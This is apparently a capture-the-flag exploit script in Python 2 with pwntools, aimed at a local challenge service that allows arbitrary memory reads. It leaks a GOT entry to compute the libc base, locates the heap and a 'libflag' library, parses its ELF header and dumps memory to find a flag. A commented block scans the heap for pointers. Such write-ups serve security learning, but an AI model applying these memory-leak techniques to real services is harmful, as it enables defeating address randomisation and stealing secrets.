#!/usr/bin/env python

from pwn import *

p = remote('localhost', 9024)
#p = process('./elf.py')
#p = process('./modified_elf.py')
print p.recvuntil('addr?:')

def step(addr):
	p.sendline('%x' % addr)
	return p.recvuntil('addr?:')[:-6]

ADDR_MEMSET_GOTPLT = 0x8720b8

ADDR_LIBC_MEMSET = u64(step(ADDR_MEMSET_GOTPLT)[:8])
log.info("libc memset addr: %x" % ADDR_LIBC_MEMSET)

ADDR_LIBC_BASE = ADDR_LIBC_MEMSET - 0x8AB80
log.info("libc base addr: %x" % ADDR_LIBC_BASE)

ADDR_HEAP_END = u64(step(ADDR_LIBC_BASE + 0x3BA590)[:8])
log.info("heap end addr: %x" % ADDR_HEAP_END)

ADDR_LIBFLAG_BASE = u64(step(ADDR_HEAP_END - 0x20550)[:8])
log.info("libflag base addr: %x" % ADDR_LIBFLAG_BASE)

header = step(ADDR_LIBFLAG_BASE) + step(ADDR_LIBFLAG_BASE + 0x20)

if header[1:4] != "ELF":
	log.fail("ELF check fail")
	exit(0)

log.success("ELF check success")

ELF_EI_CLASS = ord(header[4])
ELF_TYPE = u16(header[0x10:0x10+2])
log.info("  bit: %s" % ('32bit', '64bit')[ELF_EI_CLASS - 1])
log.info("  e_type: %s" % ('relocatable', 'executable', 'shared', 'core')[ELF_TYPE - 1])

if ELF_EI_CLASS != 2 or ELF_TYPE != 3:
	log.fail("ELF is not a 64bit dll")

ELF_ENTRY = u64(header[0x18:0x18+8])
log.info("  entry point: %x" % ELF_ENTRY)

ELF_PH_OFFSET = u64(header[0x20:0x20+8])
ELF_PH_ENT_SIZE = u16(header[0x36:0x36+2])
ELF_PH_NUM = u16(header[0x38:0x38+2])
log.info("  program header table: offset 0x%x / size 0x%x / num %d" % (
	ELF_PH_OFFSET,
	ELF_PH_ENT_SIZE,
	ELF_PH_NUM,
))

ELF_SH_OFFSET = u64(header[0x28:0x28+8])
ELF_SH_ENT_SIZE = u16(header[0x3a:0x3a+2])
ELF_SH_NUM = u16(header[0x3c:0x3c+2])
ELF_SH_STR_INDEX = u16(header[0x3e:0x3e+2])
log.info("  section header table: offset 0x%x / size 0x%x / num %d / str section index %d" % (
	ELF_SH_OFFSET,
	ELF_SH_ENT_SIZE,
	ELF_SH_NUM,
	ELF_SH_STR_INDEX,
))

if True:
	START = 0x10000
	OFFSET = 0x10000

	for i in range(19):
		offset = START + OFFSET * i
		log.info('[ Offset %x ]' % offset)

		get = step(ADDR_LIBFLAG_BASE + offset)
		print get
		print get.encode('hex')
else:
	NOT_MY_FLAG_COUNT = 4680

	offset = ADDR_LIBFLAG_BASE + ELF_ENTRY + 204 + NOT_MY_FLAG_COUNT * 0x12
	elf = step(offset) + step(offset + 0x20) + step(offset + 0x40) + step(offset + 0x60)
	log.info('[ Target ]')
	print elf
	print elf.encode('hex')
	print disasm(elf)

'''
# use this code to search through heap / the result is in log file

for start_offset in range(-32, -0x1000000, -32*20):
	p = remote('localhost', 9024)
	p.recvuntil('addr?:')

	def step(addr):
			p.sendline('%x' % addr)
			return p.recvuntil('addr?:')[:-6]

	ADDR_MEMSET_GOTPLT = 0x8720b8

	ADDR_LIBC_MEMSET = u64(step(ADDR_MEMSET_GOTPLT)[:8])
	log.info("libc memset addr: %x" % ADDR_LIBC_MEMSET)

	ADDR_LIBC_BASE = ADDR_LIBC_MEMSET - 0x8AB80
	log.info("libc base addr: %x" % ADDR_LIBC_BASE)

	ADDR_HEAP_END = u64(step(ADDR_LIBC_BASE + 0x3BA590)[:8])
	log.info("heap end addr: %x" % ADDR_HEAP_END)

	offset = start_offset
	for i in range(20):
			str = step(ADDR_HEAP_END + offset)
			if str:
					addr0 = u64(str[0:8])
					addr1 = u64(str[8:16])
					addr2 = u64(str[16:24])
					addr3 = u64(str[24:32])
					print 'offset %x / %016x : %016x %016x %016x %016x' % (offset, ADDR_HEAP_END + offset, addr0, addr1, addr2, addr3)
					if ((addr0 % 0x1000 == 0 and addr0 > 0)
						or (addr1 % 0x1000 == 0 and addr1 > 0)
						or (addr2 % 0x1000 == 0 and addr2 > 0)
						or (addr3 % 0x1000 == 0 and addr3 > 0)):
						f = open('log', 'a')
						f.write('offset %x / %016x : %016x %016x %016x %016x\n' % (offset, ADDR_HEAP_END + offset, addr0, addr1, addr2, addr3))
						f.close()
						log.success('Found!')
			offset -= 32
	p.close()
'''
